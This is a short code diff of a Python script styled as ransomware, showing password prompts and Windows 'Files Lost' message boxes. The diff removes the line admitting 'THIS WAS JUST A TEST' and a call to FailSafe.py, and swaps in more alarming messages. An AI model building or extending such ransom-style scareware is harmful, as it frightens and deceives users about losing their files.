@@ -196,7 +196,7 @@ call(["python", "FailSafe.py"])
 
 userInput = input("Files Lost\n")
 time.sleep(2)
-print("Enter Decrypt passowrd")
+print("Failed to decript")
 ctypes.windll.user32.MessageBoxW(0, "Files Lost", "Computer", 16)
 
 # Checking the password that the user put in, if its right the user will get a message saying the files are decrypted 
@@ -211,10 +211,6 @@ if userInput == password:
 	print("Your files are decrypted!")
 
 else:
-	print("Wrong password! Please restart your computer to get rid of the friendly ransomeware, THIS WAS JUST A TEST")
+	print("Restart your PC")
 	
   ctypes.windll.user32.MessageBoxW(0, "Restart your PC", "YourAcutie.TXT", 16)
-
-from subprocess import call
-call(["python", "FailSafe.py"])
-time.sleep(15)
